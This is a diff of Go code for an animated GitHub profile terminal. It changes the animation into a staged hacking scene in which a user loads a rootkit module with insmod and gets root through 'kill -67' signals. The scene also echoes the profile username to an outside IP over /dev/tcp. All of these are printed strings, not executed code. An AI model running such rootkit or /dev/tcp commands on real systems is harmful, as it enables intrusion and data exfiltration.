@@ -192,7 +192,7 @@ func (p *Profile) boot() error {
 	term.Frame(40)
 	term.ShowCursor(false)
 
-	term.Println("Release gifBIOS v7.3.4 - Build date 20/01/2031")
+	term.Println("Release 0x0539 OS v7.3.4 - Build date 20/01/2031")
 	term.Frame(20)
 	term.Println("(C) 2022 GIF Systems Inc.\n\n\n")
 	term.Frame(20)
@@ -204,7 +204,7 @@ func (p *Profile) boot() error {
 	term.CursorToRow(7)
 	term.Frame(20)
 
-	term.Println("Main Processor: GifCPU - 100Hz")
+	term.Println("Main Processor: GifCPU - 999GHz")
 	term.Frame(20)
 	for i := 0; i < 0x40000000; i += 0x4ffffff {
 		term.ClearLine()
@@ -222,7 +222,7 @@ func (p *Profile) boot() error {
 	term.Clear()
 	term.Frame(100)
 
-	term.Print("Starting GifOS...")
+	term.Print("Starting 0x0539...")
 	term.Frame(150)
 	term.Clear()
 
@@ -232,12 +232,12 @@ func (p *Profile) boot() error {
 func (p *Profile) login(_ context.Context) error {
 
 	p.term.Clear()
-	p.term.Println("GifOS v0.1.0 tty1")
+	p.term.Println("0x0539 pwnd v0.1.0 tty1")
 	p.term.Println("")
 	p.term.Print("login: ")
 	p.term.ShowCursor(true)
 	p.term.Frame(150)
-	p.term.Type("visitor\n", terminal.Fast)
+	p.term.Type("howosecurity\n", terminal.Fast)
 
 	p.term.Print("password: ")
 	p.term.ShowCursor(true)
@@ -245,20 +245,22 @@ func (p *Profile) login(_ context.Context) error {
 	p.term.Println("")
 	p.term.Println("")
 	p.term.Println(fmt.Sprintf("Last login %s on tty1", time.Now().Add(time.Hour*-24).Format(time.RFC1123)))
-	p.term.Print(`Welcome to GifOS v0.1.0
+	p.term.Print(`Welcome to 0x0539 v0.1.0
 
   * Documentation: https://github.com/liamg/github-profile-terminal-action
 
-0 packages can be updated.
-0 updates are security updates.
+81 packages can be updated.
+14 updates are security updates.
 `)
 	p.term.Frame(50)
 
 	return nil
 }
 
+var prompt string = "\nhowosecurity@vds-73125908:~$ "
+
 func (p *Profile) prompt() {
-	p.term.Print("\nvisitor@github:~$ ")
+	p.term.Print("\nhowosecurity@vds-73125908:~$ ")
 	p.term.ShowCursor(true)
 	p.term.Frame(75)
 }
@@ -269,39 +271,13 @@ func (p *Profile) showStats(ctx context.Context) error {
 
 	p.term.Frame(75)
 
-	p.term.Type("ls -la\n", terminal.Fast)
-	p.term.Print(`drwxr-xr-x 10  visitor visitor 4.0K Mar 14 06:33 .
-drwxr-xr-x  35 visitor visitor 4.0K Mar 11 06:17 ..
--rw-------   1 visitor visitor 2.7K Mar 14 09:03 .bash_history
--rw-r--r--   1 visitor visitor   21 Nov 21 19:31 .bash_logout
--rw-r--r--   1 visitor visitor   78 Dec 17 13:06 .bash_profile
--rw-r--r--   1 visitor visitor  609 Mar 14 20:19 .bashrc
-drwxr-xr-x   3 visitor visitor 4.0K Jan 12 20:49 .bundle
-drwxr-xr-x  21 visitor visitor 4.0K Mar  8 20:26 .cache
-drwxr-xr-x   4 visitor visitor 4.0K Dec 17 13:08 .cargo
-drwx------  27 visitor visitor 4.0K Mar 14 21:49 .config
-drwxr-xr-x   2 visitor visitor 4.0K Dec 24 18:59 Desktop
-drwxr-xr-x   2 visitor visitor 4.0K Mar 11 21:11 Downloads
--rw-r--r--   1 visitor visitor  398 Mar  3 21:43 .gitconfig
--rwx------   1 visitor visitor  239 Mar 11 22:58 ghlookup
--rw-r--r--   1 visitor visitor   14 Jan  3 10:51 .gitignore
-drwx------   5 visitor visitor 4.0K Mar 14 21:56 .gnupg
-drwxr-xr-x   4 visitor visitor 4.0K Dec 27 20:14 go
--rw-------   1 visitor visitor  15K Mar 15 20:06 .histfile
--rw-------   1 visitor visitor   20 Mar 14 21:52 .lesshst
-drwx------   3 visitor visitor 4.0K Dec 17 19:15 .local
-drwx------   3 visitor visitor 4.0K Dec 17 20:06 .pki
--rw-r--r--   1 visitor visitor   21 Dec 17 13:06 .profile
-drwxr-xr-x   6 visitor visitor 4.0K Dec 17 13:07 .rustup
-drwx------   2 visitor visitor 4.0K Mar  8 20:02 .ssh
-drwxr-xr-x   2 visitor visitor 4.0K Jan  2 13:12 .vim
--rw-------   1 visitor visitor  16K Jan  3 15:12 .viminfo
-drwxr-xr-x   3 visitor visitor 4.0K Dec 27 19:08 .vscode-oss
--rw-r--r--   1 visitor visitor  426 Jan  8 19:56 .zprofile
--rw-r--r--   1 visitor visitor  877 Mar 14 20:27 .zshaliases
--rw-r--r--   1 visitor visitor  600 Jan  3 18:29 .zshenv
--rw-------   1 visitor visitor  212 Jan  3 19:55 .zsh_history
--rw-r--r--   1 visitor visitor 1.2K Mar 14 20:37 .zshrc
+	p.term.Type("ls -lAh\n", terminal.Fast)
+	p.term.Print(`
+Total 2.5M
+-rwxr-wr--   6 howosecurity howosecurity 4.0K Dec 17 13:07 b4ckd0oR.py
+-rw-r--r--   1 root root                 2.0M Jan  2 13:12 anakin.ko
+-rwxr-xr-x   1 howosecurity howosecurity 732  Apr 21 19:26 copy-fail.py
+-rwxrwxr-x   1 howosecurity howosecurity 54   Jun  3 17:04 rk-helper.sh
 `)
 	p.prompt()
 	p.term.Frame(75)
@@ -313,7 +289,56 @@ drwxr-xr-x   3 visitor visitor 4.0K Dec 27 19:08 .vscode-oss
 
 	user := stats.User
 
-	p.term.Type(fmt.Sprintf("./ghlookup -u %s\n", user.GetLogin()), terminal.Fast)
+	p.term.Type("sudo insmod anakin.ko", terminal.Fast)
+	p.term.Print(`\n[sudo] password for howosecurity: `)
+	p.term.Frame(200)
+
+	p.prompt()
+	p.term.Frame(75)
+	p.term.Type(`kill -67 $(printf "%d" 0x$(echo -n help | xxd -p))`, terminal.Fast)
+	p.term.Print(`\nkill: kill 1751477360 failed: permission denied\n`)
+
+	p.prompt()
+	p.term.Frame(50)
+	p.term.Type(`sudo dmesg -l debug | tail`, terminal.Fast)
+	p.term.Print(`
+               =========== AnakinRK Help Menu ===========
+[ 4715.811268] =	CMD	Signal	Description	=
+[ 4715.811269] ==========================================
+[ 4715.811269] =	root	67	Get Root	=
+[ 4715.811271] =	hide	67	Toggle hide	=
+[ 4715.811271] =	none	69	Toggle hide port	=
+[ 4715.811272] =	help	67	Help Menu	=
+[ 4715.811273] ==========================================
+
+`)
+
+	p.prompt()
+	p.term.Frame(75)
+
+	p.term.Type(`cat rk-helper.sh`, terminal.Fast)
+	p.term.Print(`
+#/bin/sh
+printf "%d" 0x$(printf "%.4s" "$1" | xxd -p)
+`)
+
+	p.prompt()
+	p.term.Frame(75)
+
+	p.term.Type(`kill -67 $(./rk-helper root)`, terminal.Fast)
+	p.term.Println(`\nkill: kill 1919905652 failed: no such process`)
+
+	p.prompt()
+	p.term.Frame(75)
+	prompt = "\nroot@vds-73125908:~# "
+
+	p.term.Type(`whoami`, terminal.Fast)
+	p.term.Println("\nroot")
+
+	p.prompt()
+	p.term.Frame(75)
+
+	p.term.Type(fmt.Sprintf(`echo "fetch %s" > /dev/tcp/4.228.31.150/443\n`, user.GetLogin()), terminal.Fast)
 	p.term.ShowCursor(false)
 
 	p.term.Print("\nConnecting...")
@@ -331,14 +356,6 @@ drwxr-xr-x   3 visitor visitor 4.0K Dec 27 19:08 .vscode-oss
 	p.term.Print("   Username:    ")
 	p.term.SetHighlight(true)
 	p.term.Println(user.GetLogin())
-	p.term.SetHighlight(false)
-	p.term.Print("   Real name:   ")
-	p.term.SetHighlight(true)
-	p.term.Println(user.GetName())
-	p.term.SetHighlight(false)
-	p.term.Print("   Location:    ")
-	p.term.SetHighlight(true)
-	p.term.Println(user.GetLocation())
 	p.term.SetHighlight(false)
 	p.term.Println("")
 	p.term.Println("")
